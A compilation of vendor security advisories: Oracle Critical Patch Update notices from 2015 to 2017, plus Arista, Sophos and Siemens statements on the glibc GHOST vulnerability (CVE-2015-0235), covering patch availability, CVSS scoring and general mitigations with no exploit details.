# Oracle Critical Patch Update Advisory - July 2015

## Oracle Critical Patch Update Advisory - July 2015

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to: [Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 193 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [https://blogs.oracle.com/security](https://blogs.oracle.com/security/).

**Please note that on May 15, 2015, Oracle released  [Security Alert for CVE-2015-3456 (QEMU "Venom")](/security-alerts/cve-2015-3456.html) .Customers of affected Oracle products are strongly advised to apply the fixes and/or configuration steps that were announced for CVE-2015-3456.**

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available at: [https://www.oracle.com/security-alerts/cpufaq.html#CVRF](/security-alerts/cpufaq.html#CVRF).

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in previous [Critical Patch Update advisories](/security-alerts/) . An English text version of the risk matrices provided in this document is available [here](/security-alerts/cpujul2015verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](//cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 2.0 (see  [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS 2.0). Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see  [Oracle vulnerability disclosure policies](https://www.oracle.com/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review  [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update July 2015 Availability Document, [My Oracle Support Note 2005667.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2005667.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](https://www.oracle.com/support/lifetime-support/) . We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 25 new security fixes for Oracle Java SE. 23 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](/security-alerts/cpujul2015verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Partial" instead of "Complete", lowering the CVSS Base Score. For example, a Base Score of 10.0 becomes 7.5.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 7 and 8 releases.

## Security Advisory 0009 [PDF](/en/support/advisories-notices/security-advisory/1053-security-advisory-9?tmpl=component&format=pdf "PDF")

**Date:** January 28th 2015

| Revision | Date | Changes |
| --- | --- | --- |
| 1.0 | January 28th 2015 | Initial release |

**Arista 7000 Series Products and Arista EOS are not remotely exploitable by CVE-2015-0235**

On Jan 27th, information was released about a security advisory for the glibc function \_\_nss\_hostname\_digits\_dots() which could be called via gethostbyname or other similar functions. This vulnerability could allow for a buffer overflow and code execution in affected applications.

A number of customers have contacted Arista Networks, asking if their Arista products are susceptible to the vulnerability. After examining our code base we have determined that we are not vulnerable to remote attackers attempting to make use of this exploit.

Please note that there are several features that use hostnames that are configurable by the switch administrator and may be vulnerable to this CVE. These features require an exec privilege (configuration) level access to set the hostname. Administrators with exec access are already trusted users.

Arista Networks plan to integrate fixes to glibc for currently supported versions of EOS to remove this issue in future versions.

BugID 110326 addresses this issue.

# Oracle Critical Patch Update Advisory - April 2015

## Oracle Critical Patch Update Advisory - April 2015

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](https:///security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of malicious exploitation of vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that malicious attackers have been successful because customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes without delay.**

This Critical Patch Update contains 98 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at [https://blogs.oracle.com/security.](https://blogs.oracle.com/security/)

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available at: [https://www.oracle.com/security-alerts/cpufaq.html#CVRF.](/security-alerts/cpufaq.html#CVRF)

#### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories.](https:///security-alerts/) An English text version of the risk matrices provided in this document is available [here.](/security-alerts/cpuapr2015verbose.html)

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a CVE# which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in italics indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 2.0 (see [Oracle CVSS](/security-alerts/cvssscoringsystem.html)  Scoring for an explanation of how Oracle applies CVSS 2.0). Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies.](https://www.oracle.com/corporate/security-practices/assurance/vulnerability/disclosure.html)

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the only variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible.** Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review [previous Critical Patch Update advisories](https:///security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update April 2015 Availability Document, [My Oracle Support Note 1967243.1.](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967243.1)

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy.](https://www.oracle.com/support/lifetime-support/) We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1. Please review the](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1) [Technical Support Policies](https://www.oracle.com/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have purchased Extended Support under the [Lifetime Support Policy.](https://www.oracle.com/support/lifetime-support/) Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

The English text form of this Risk Matrix can be found [here.](https:///security-alerts/cpuapr2015verbose.html#JAVA)

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Partial" instead of "Complete", lowering the CVSS Base Score. For example, a Base Score of 10.0 becomes 7.5.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 7 and 8 releases.

![nsg](https://news.sophos.com/wp-content/uploads/2014/05/nsg.png)In the last couple of days, a [widespread Linux vulnerability known as GHOST](https://nakedsecurity.sophos.com/2015/01/29/the-ghost-vulnerability-what-you-need-to-know/ "The GHOST vulnerability - what you need to know") has been receiving a lot of attention in the security community. In theory, this vulnerability can allow an attacker to remotely execute code on a Linux computer. There is already proof of concept code that puts this theory into practice, and it is expected that real world attacks are just around the corner.

The Sophos product teams have been thoroughly investigating to determine which of our products are affected and what is necessary to address those that are.

Many Sophos products do not use Linux, or the *glibc* software at the heart of the vulnerability, and are therefore unaffected. This includes Sophos Endpoint Protection (Antivirus) for Windows, Mac and Unix; Secure Email Gateway; PureMessage for Microsoft Exchange; Mobile Control and likely others that we are still verifying.

However, Sophos UTM, Sophos UTM Manager (SUM), Secure Web Gateway, Sophos Secure OS for AWS, the Sophos Cloud management infrastructure, and the SAV for vShield virtual appliance are all built on the Linux platform and include the *glibc* software that is responsible for the vulnerability. The extent to which this vulnerability can be exploited varies from product to product. In all cases, the product teams are working quickly to update vulnerable software. **For information about update availability, [see this knowledgebase article](https://www.sophos.com/en-us/support/knowledgebase/121879.aspx?cmp=70130000001xKqzAAE "Sophos Knowledgebase: The glibc (Ghost) vulnerability: affected versions, recommended steps and workarounds").**

Our products that customers install and run on their own installations of Linux (e.g., SAV for Linux, PureMessage for Unix) are *not* believed to introduce a vulnerability. However, the customer’s underlying Linux system may be vulnerable. Customers are encouraged to test and install vendor-supplied security patches for their Linux distributions to protect against GHOST and other vulnerabilities.

SophosLabs is monitoring for methods and attacks targeting this vulnerability and will use the full capabilities of our product line to deliver protection for customers.

**[Please see this knowledgebase article](https://www.sophos.com/en-us/support/knowledgebase/121879.aspx?cmp=70130000001xKqzAAE "Sophos Knowledgebase: The glibc (Ghost) vulnerability: affected versions, recommended steps and workarounds")** for the latest information on which products and versions are affected and what, if any, actions are required for customers to remain secure.

To learn more about the GHOST vulnerability, read the [excellent write-up on Naked Security](https://nakedsecurity.sophos.com/2015/01/29/the-ghost-vulnerability-what-you-need-to-know/ "Sophos Naked Security: The GHOST vulnerability - what you need to know").

# Oracle Critical Patch Update Advisory - January 2016

## Oracle Critical Patch Update Advisory - January 2016

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 248 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at <https://blogs.oracle.com/security>.

**Please note that on November 10, 2015, Oracle released [Security Alert for CVE-2015-4852](/security-alerts/alert-cve-2015-4852.html). Customers of affected Oracle products are strongly advised to apply the fixes and/or configuration steps that were announced for CVE-2015-4852.**

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available at: [https://www.oracle.com/security-alerts/cpufaq.html#CVRF](/security-alerts/cpufaq.html#CVRF).

#### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is available  [here](/security-alerts/cpujan2016verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 2.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS 2.0). Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update January 2016 Availability Document, [My Oracle Support Note 2074802.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2074802.1 ).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](//www.oracle.com/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](//www.oracle.com/support/lifetime-support/). Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Appendix - Oracle Applications

#### Oracle E-Business Suite Executive Summary

This Critical Patch Update contains 78 new security fixes for the Oracle E-Business Suite. 69 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2016verbose.html#EBS).

Oracle E-Business Suite products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the January 2016 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Releases 11i and 12 Critical Patch Update Knowledge Document (January 2016), [My Oracle Support Note 2072202.1.](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2072202.1)

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 8 new security fixes for Oracle Java SE. 7 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujan2016verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Partial" instead of "Complete", lowering the CVSS Base Score. For example, a Base Score of 10.0 becomes 7.5.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 7 and 8 releases.

WORKAROUNDS AND MITIGATIONS

Siemens has identiﬁed the following speciﬁc workarounds and mitigations that customers can apply to
reduce the risk:

• For the affected SINUMERIK controllers and SIMATIC HMIs, restrict local access to the device.

• For Ruggedcom APE, the attacker must be able to inﬂuence parameters that are passed to the
vulnerable functions. This is only possible if the user installed applications on the device which use
the vulnerable functions, and if those functions are accessible by an attacker. Follow the process
provided in the corresponding remediation table.

GENERAL SECURITY RECOMMENDATIONS

As a general security measure, Siemens strongly recommends to protect network access to devices
with appropriate mechanisms. In order to operate the devices in a protected IT environment, Siemens
recommends to conﬁgure the environment according to Siemens’ operational guidelines for Industrial
Security (Download: https://www.siemens.com/cert/operational-guidelines-industrial-security), and to
follow the recommendations in the product manuals.

Additional information on Industrial Security by Siemens can be found at: https://www.siemens.com/
industrialsecurity

PRODUCT DESCRIPTION

SINUMERIK CNC offers automation solutions for the shop ﬂoor, job shops and large serial production
environments.

RUGGEDCOM APE serves as an utility-grade computing platform for the RUGGEDCOM RX1500 router
family.
It also allows to run third party software applications without needing to procure an external
industrial PC.

SIMATIC HMI Panels are used for operator control and monitoring of machines and plants.

SIPLUS extreme products are designed for reliable operation under extreme conditions and are based on
SIMATIC, LOGO!, SITOP, SINAMICS, SIMOTION, SCALANCE or other devices. SIPLUS devices use the
same ﬁrmware as the product they are based on.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2015-0235

The vulnerability could cause a Denial-of-Service of the system. Only authenticated users may exploit
this vulnerability.

# Oracle Critical Patch Update Advisory - July 2017

## Oracle Critical Patch Update Advisory - July 2017

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to: [Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 310 new security fixes across the product families listed below. Please note that a MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at [July 2017 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2282980.1).

Please note that the vulnerabilities in this Critical Patch Update are scored using version 3.0 of Common Vulnerability Scoring Standard (CVSS).

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available [here](/security-alerts/cpufaq.html#CVRF).

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document,  [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Users running Java SE with a browser can download the latest release from [http://java.com](//www.java.com/en/). Users on the Windows and Mac OS X platforms can also use  [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document,  [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates (CPUs) and Solaris Third Party bulletins.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in  [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujul2017verbose.html) .

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a  [CVE#](//cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see  [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible** . Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update July 2017 Availability Document,  [My Oracle Support Note 2261562.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2261562.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](/support/lifetime-support/). Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Appendix - Oracle Applications

#### Oracle E-Business Suite Executive Summary

This Critical Patch Update contains 22 new security fixes for the Oracle E-Business Suite. 18 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujul2017verbose.html#EBS).

Oracle E-Business Suite products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security fixes are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the July 2017 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Release 12 Critical Patch Update Knowledge Document (July 2017), [My Oracle Support Note 2270270.1.](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2270270.1) Some of the risk matrix rows in this section are assigned multiple CVE#s. In these cases, additional CVEs are listed below the risk matrix to improve readability. Each group of CVE identifiers share the same description, vulnerability type, Component, Sub-Component and affected versions listed in the risk matrix entry, but occur in different code sections within a Sub-Component.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 32 new security fixes for Oracle Java SE. 28 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials. The English text form of this Risk Matrix can be found [here](/security-alerts/cpujul2017verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Low" instead of "High", lowering the CVSS Base Score. For example, a Base Score of 9.6 becomes 7.1.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 8 releases.

